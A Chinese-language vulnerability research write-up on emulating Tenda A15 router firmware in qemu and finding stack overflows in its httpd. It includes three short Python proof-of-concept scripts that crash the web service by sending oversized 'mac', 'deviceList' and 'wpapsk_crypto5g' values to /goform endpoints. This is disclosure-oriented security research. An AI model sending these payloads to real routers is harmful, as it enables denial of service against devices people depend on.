# Tenda A15 固件模拟与漏洞挖掘
> 我的昵称
> 来源：https://www.iotsec-zone.com/article/493

# 前言

几个星期前，初来训练营，初学AC15的漏洞挖掘。前几天偶然发现AC15有新的漏洞[CVE-2025-0566](https://nvd.nist.gov/vuln/detail/CVE-2025-0566)，打算看看。发现该漏洞属于A15设备，并非AC15，那就顺水推舟分析下A15固件安全吧。

# 固件模拟

> 固件地址：[https://www.tendacn.com/download/detail-3187.html](https://www.tendacn.com/download/detail-3187.html)

## 固件解压

下载后，使用`binwalk`解压

 

![0.png](https://www.iotsec-zone.com/api/image/v2/20250210/d7osu3yyl2pbouctjd.png)

## 查看固件架构

使用`file`命令，得知是`MIPS LSB 32位`架构

 

![1.png](https://www.iotsec-zone.com/api/image/v2/20250210/d7osu6swo34jpva3x3.png)

## checksec

 

![2.png](https://www.iotsec-zone.com/api/image/v2/20250210/d7osu8fgctvrm8pdna.png)

未开启`Canary`和`PIE`

# 固件信息收集

使用`firmwalker` 进行固件信息收集

```bash
~/Desktop/Apps/firmwalker_pro main*
❯ ./firmwalker.sh ~/Desktop/Firmwares/a15/squashfs-root > ~/Desktop/Firmwares/a15/firm
walker_scan.txt
```

 

![3.png](https://www.iotsec-zone.com/api/image/v2/20250210/d7osubhulut57ljqtr.png)

发现 `web` 服务是`httpd`程序

# 启动项分析

 

![4.png](https://www.iotsec-zone.com/api/image/v2/20250210/d7osudqq992dkr3ie3.png)

查看`/etc_ro/init.d/rcS`文件进行启动项分析，可知启动项进行了拷贝文件夹。

我们也跟着手动创建一遍，可以避免后面程序模拟启动，文件夹为空的问题。

# 用户模拟

我们开始先尝试`qemu`用户模拟

```bash
 ~/Desktop/Firmwares/a15/squashfs-root
❯ cp $(which qemu-mipsel-static) qemu-mipsel-static

~/Desktop/Firmwares/a15/squashfs-root
❯ sudo chroot . ./qemu-mipsel-static ./bin/httpd
```

 

![5.png](https://www.iotsec-zone.com/api/image/v2/20250210/d7osugwi8oxhsgbjyq.png)

发现能成功启动，但`ip`配置错误，这里我们就要使用`ida`进行分析了

## 逆向分析httpd

### 查找赋值`ip`的位置

 

![6.png](https://www.iotsec-zone.com/api/image/v2/20250210/d7osuk39x9fgzvq3dz.png)

 

![7.png](https://www.iotsec-zone.com/api/image/v2/20250210/d7osum4vphyljozaws.png)

向上查找，查看`sockaddr.sin_addr` 被赋值的地方

![8.png](https://www.iotsec-zone.com/api/image/v2/20250210/d7osuoks4oj3stk7gh.png)

得知是函数参数进行赋值的

按`x`查看该函数的交叉引用，

 

![9.png](https://www.iotsec-zone.com/api/image/v2/20250210/d7osuqgnxotf2hhfzj.png)

继续交叉引用查找

 

![10.png](https://www.iotsec-zone.com/api/image/v2/20250210/d7osut3fcekfjznnvw.png)

发现是`br0IP` 赋值给了程序的`ip`，所以我们这里得知`ip`地址是`br0`网卡的`ip`，于是我们开始创建`br0`网卡

## 创建br0

```bash
sudo brctl addbr br0
sudo ifconfig br0 192.168.0.1
```

 

![11.png](https://www.iotsec-zone.com/api/image/v2/20250210/d7osuv3rr9xdjq7cfy.png)

成功创建

## 再次启动

> 做完上面这些之后，我们还要把固件包中`webroot_ro`文件夹的内容复制到`webroot`里面，不然网页端会提示`page not found`，这点我们可以由前面启动项分析得出。

```bash
~/Desktop/Firmwares/a15/squashfs-root/lib
❯ sudo chroot . ./qemu-mipsel-static ./bin/httpd
```

 

![12.png](https://www.iotsec-zone.com/api/image/v2/20250210/d7osux8711t5zkq8ic.png)

 

![13.png](https://www.iotsec-zone.com/api/image/v2/20250210/d7osuyx4t6f4ajifzh.png)

成功启动并访问。

# 系统模拟

前面尝试了用户模拟，接下来，我们来进行`mipsel`系统模拟

### 主机网卡配置脚本

> 注意：先把主机网卡配置好，再启动`qemu-system-mipsel`脚本

```bash
#!/bin/bash

# 创建名为 tap0 的虚拟网络接口
sudo tunctl -t tap0

# 配置 tap0 接口的 IP 地址和子网掩码
sudo ifconfig tap0 192.168.0.4/24 up

# 启用 IP 转发
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward > /dev/null

# 配置 NAT (假设物理机外网接口是 ens33)
sudo iptables -t nat -A POSTROUTING -o ens33 -j MASQUERADE

# 允许 tap0 接口的数据包转发
sudo iptables -A FORWARD -i tap0 -j ACCEPT
sudo iptables -A FORWARD -o tap0 -j ACCEPT

echo "tap0 接口创建和配置完成。"

```

```bash
~/Desktop/Firmwares/qume_system
❯ ./net.sh
[sudo] password for kali:
Set 'tap0' persistent and owned by uid 0
tap0 接口创建和配置完成。
```

### `qemu-system-mipsel`启动脚本

```bash
#!/bin/sh
qemu-system-mipsel \
-M malta \
-kernel /home/kali/Desktop/Apps/qemu-images/mipsel/vmlinux-2.6.32-5-4kc-malta \
-hda /home/kali/Desktop/Apps/qemu-images/mipsel/debian_squeeze_mipsel_standard.qcow2 \
-append "root=/dev/sda1 console=tty0"  \
-nographic \
-net nic -net tap,ifname=tap0,script=no,downscript=no
```

```bash
~/Desktop/Firmwares/qume_system
❯ sudo ./mipsel.sh
```

### mips虚拟机

```bash
ip link add br0 type dummy
ifconfig eth0 192.168.0.5/24
ifconfig br0 192.168.0.6/24
```

 

![14.png](https://www.iotsec-zone.com/api/image/v2/20250210/d7osv33aj8g0if9ghx.png)

### 传输文件

 

![15.png](https://www.iotsec-zone.com/api/image/v2/20250210/d7osv4xy3bn1qdzvjq.png)

将文件进行传输，解压文件后，启动即可

```bash
chroot . sh
./bin/httpd
```

 

![16.png](https://www.iotsec-zone.com/api/image/v2/20250210/d7osv8j7xhphi0wrmu.png)

同样成功模拟。

## ssh连接

启用ssh

```bash
sudo service ssh start
sudo service ssh status
```

 

![17.png](https://www.iotsec-zone.com/api/image/v2/20250210/d7osvbi4n3f9dq4frv.png)

直接ssh连接下，发现无法连接

 

![18.png](https://www.iotsec-zone.com/api/image/v2/20250210/d7osvesj5xds8jkpfj.png)

查看`openssl`版本，发现是虚拟机ssh版本太老

解决方案：加上`-oHostKeyAlgorithms=+ssh-rsa`

```bash
~/Desktop/Firmwares/qume_system
❯ ssh -oHostKeyAlgorithms=+ssh-rsa root@192.168.0.5
```

 

![19.png](https://www.iotsec-zone.com/api/image/v2/20250210/d7osvgntpqqugcr6d8.png)

成功`ssh`登录

# 逆向分析与漏洞挖掘

 

![20.png](https://www.iotsec-zone.com/api/image/v2/20250210/d7osviqi7hyeqzixpv.png)

找到定义所有函数的地方，方便我们我们测试这些函数

 

![21.png](https://www.iotsec-zone.com/api/image/v2/20250210/d7osvkx946f9zsdvna.png)

我们要重点关注`set` 类型的函数，因为大多数是需要接受前端数据，进行设置操作的，因此存在较高的安全风险。

分析处理`SetOnlineDevName` 请求的`formSetDeviceName` 函数

我们先来查看`formSetDeviceName` 函数，它用于处理`SetOnlineDevName` 请求

 

![22.png](https://www.iotsec-zone.com/api/image/v2/20250210/d7osvmonmv8mf71r7w.png)

由图可见，该函数是一个用于设置设备名称的，处理两个请求的参数`mac`和`devName`，然后使用`set_device_name` 方法进行处理，进去`set_device_name` 查看具体处理逻辑。

 

![23.png](https://www.iotsec-zone.com/api/image/v2/20250210/d7osvo87rcwtkmhohf.png)

我们注意到，两个参数被传给了`sprintf` ，而`sprintf`由于未使用格式化字符，且两个参数都未限制长度和校验，因此存在栈溢出和格式化字符串漏洞

下面我们进行poc的编写

```python
import requests
ip = '192.168.4.1'
url = f'http://{ip}/goform/SetOnlineDevName'
payload = {
    "mac": '9c:fc:e8:da:9c:5b'*0x100,
    "devName": 'devname1'
}
res = requests.post(url=url, data=payload)
print(res.content)
```

 

![24.png](https://www.iotsec-zone.com/api/image/v2/20250210/d7osvqanktclfb3lbt.png)

执行脚本后发现，程序并未崩溃，同时打印出了`set device name error!` 这与我们预期的不一致，打开ida，进行逆向分析

## IDA patch

 

![25.png](https://www.iotsec-zone.com/api/image/v2/20250210/d7osvsul666i9ydvjw.png)

箭头处，就是问题所在，这个外部函数是进行写入`nvram` 设备的操作，而我们是qemu用户模拟所以导致这个函数调用会失败，导致判断`if` 进入打印报错。

这里我们直接进行patch，改变控制逻辑。

 

![26.png](https://www.iotsec-zone.com/api/image/v2/20250210/d7osvuzzz3clvb1qlu.png)

`bnez` (**Branch if Not Equal to Zero**) 是 MIPS 架构中的 **条件分支指令**，它的作用是：

> 如果寄存器的值不等于 0，则跳转到指定的标签（目标地址）。

这里我们直接`patch`为`nop`

> 在汇编语言中，`nop` 指令表示 **"No Operation"**，即 **空操作**。执行这条指令时，处理器什么都不做，单纯消耗一个时钟周期。

 

![27.png](https://www.iotsec-zone.com/api/image/v2/20250210/d7osvxfrkvnsdbr1mb.png)

然后保存`patch`结果即可

## 再次执行脚本

再次执行前面的脚本后，程序崩溃，证明存在该漏洞，攻击者任选`mac`和`devName` 参数即可进行攻击

 

![28.png](https://www.iotsec-zone.com/api/image/v2/20250210/d7osvzfiby70g547t2.png)

分析处理`setBlackRule`请求的`formAddMacfilterRule`函数

接下来查看处理`setBlackRule`请求的`formAddMacfilterRule`函数

 

![29.png](https://www.iotsec-zone.com/api/image/v2/20250210/d7osw1hxp3tiayf5ml.png)

这个函数的主要功能是用于处理添加MAC地址过滤规则。

看到箭头处`rule` 接收的是`deviceList` 参数，然后给`parse_macfilter_rule` 进行处理。

我们跟进函数分析。

 

![30.png](https://www.iotsec-zone.com/api/image/v2/20250210/d7osw3ko9r1x3u79bp.png)

发现我们传入的`deviceList`  最终会作为`source_rule`拷贝给了`dest_rule->name` ，这个就是经典的`strcpy` 栈溢出漏洞，经过查看，前面也并未限制长度，只进行了`\r` 是否包含的校验，如下图

 

![31.png](https://www.iotsec-zone.com/api/image/v2/20250210/d7osw5fl5ksij17lpg.png)

```bash
rule_tmp = strchr(source_rule, 13);
```

上述代码判断`source_rule` 是否包含`\r` ，如包含返回`1`，不包含返回`0`，因此我们要让代码执行到`strcpy` 处，必须要在我们的脚本参数中添加`\n`

我们开始编写poc

```bash
import requests
ip = '192.168.4.1'
url = f'http://{ip}/goform/setBlackRule'

payload = {
    'deviceList': 'a' * 0x100+ '\r' 
}

r = requests.post(url=url, data=payload)

print(r.content)
```

 

![32.png](https://www.iotsec-zone.com/api/image/v2/20250210/d7osw7n4fzrh4mgrok.png)

执行脚本后，程序成功崩溃

分析处理`WifiExtraSet` 请求的`fromSetWirelessRepeat` 函数

 

![33.png](https://www.iotsec-zone.com/api/image/v2/20250210/d7oswajeakcfveijxt.png)

接下来我们分析处理`WifiExtraSet` 请求的`fromSetWirelessRepeat` 函数

 

![34.png](https://www.iotsec-zone.com/api/image/v2/20250210/d7oswcgtkk1mwu7g7b.png)

```bash
ssida <- "originSsid5g"
ssid_encodea <- "encode5g"
securitya <- "security5g"
wpapsk_typea <- "wpapsk_type5g"
wpapsk_cryptoa <- "wpapsk_crypto5g"
wpapsk_keya <- "wpapsk_key5g"
```

这些参数都是我们前端`post`请求中需要携带的参数

然后`sprintf`打印出来后，交由`if` 中的`set_repeat5` 这个函数进行处理

我们进入这个函数，查看处理的代码

 

![35.png](https://www.iotsec-zone.com/api/image/v2/20250210/d7oswetxvpcn1iakym.png)

这个函数`set_repeat5`的主要功能是配置5GHz无线网络的参数。

虽然调用了一堆`strcpy` 函数，但我们真正关心上面方框位置处。

`wpapsk_crypto` 由我们前端发送的`wpapsk_crypto5g` 赋值，而它的值会拷贝给`wpapsk_cryptovalue` ，之前并未进行安全检查，所以我们可以利用该点作为栈溢出漏洞。

### POC

下面我们来进行poc的编写，

```bash
import requests

ip = '192.168.4.1'
url = f'http://{ip}/goform/WifiExtraSet'

payload = {
    'configured5g': 'true',
    'originSsid5g': '1234',
    'encode5g': '1234',
    'security5g': 'wpapsk',
    'wpapsk_type5g': 'wpa2',
    'wpapsk_crypto5g': 'a'* 0x12,
    'wpapsk_key5g': '1234567890'
}

res = requests.post(url=url, data=payload)

print(res)
```

设置`WifiExtraSet` 的其他参数正常填写，然后将`wpapsk_crypto5g` 参数用较长的字符数来填充实现缓冲区溢出。

 

![36.png](https://www.iotsec-zone.com/api/image/v2/20250210/d7oswi2p5j1z5dhkog.png)

执行我们的脚本，最终程序崩溃，漏洞点存在。

### CVE申请

上述漏洞经过历史查找，并未找到对应申报情况，于是我们将发现的这个漏洞上报给CVE。

 

![37.png](https://www.iotsec-zone.com/api/image/v2/20250210/d7oswkfjqzjepywonh.png)
